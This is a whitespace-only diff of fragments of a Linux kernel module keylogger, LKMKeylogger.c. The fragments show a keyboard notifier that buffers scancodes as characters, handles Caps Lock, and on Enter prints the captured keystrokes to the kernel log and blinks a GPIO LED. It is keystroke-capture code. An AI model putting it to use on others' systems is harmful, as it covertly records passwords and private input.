@@ -2,7 +2,7 @@
  ============================================================================
  Name        : LKMKeylogger.c
  Author      : Patrick Collins
- Email		 : Contact@paddylonglegs.site
+ Email	     : Contact@paddylonglegs.site
  Version     : 1.0
  Copyright   : © 2023 Patrick Collins <Contact@paddylonglegs.site>
  License     : GPL v2
@@ -147,8 +147,8 @@ static struct notifier_block keylogger_notify = {
 */
 int send(void)
 {
-	printk(KERN_INFO "Keystrokes:");
-	printk(KERN_CONT "[%s]", keystrokes); //print continuous line of keystrokes
+    printk(KERN_INFO "Keystrokes:");
+    printk(KERN_CONT "[%s]", keystrokes); //print continuous line of keystrokes
 
     if (!gpio_is_valid(Led)){
     	 printk(KERN_INFO "LKMKeylogger: invalid GPIO\n");
@@ -164,7 +164,7 @@ int send(void)
 	}
 
     //cleanup
-	strcpy(keystrokes, "");
+    strcpy(keystrokes, "");
     return 0;
 }
 
@@ -196,21 +196,21 @@ int keylogger(struct notifier_block *nblock,
 
 	if (param->value == usb_keyboard_scancodes[27]) // Enter Scancode Pressed
 	{ 
-			char* s = convert[27];
-			leng = strlen(s);
-			strcat(keystrokes,s);
+		char* s = convert[27];
+		leng = strlen(s);
+		strcat(keystrokes,s);
         	send();
-		    return NOTIFY_OK;
+		return NOTIFY_OK;
 	}
 
 	if(param->value == 0x3a && caps == true) //User wants CAPS off
 	{
-			caps = false;
-			capsCheck++;
+		caps = false;
+		capsCheck++;
 	}
 	if(param->value == 0x3a && caps == false && capsCheck<1) //User wants CAPS on
 	{
-			caps = true;
+		caps = true;
 	}
 	capsCheck = 0;
 
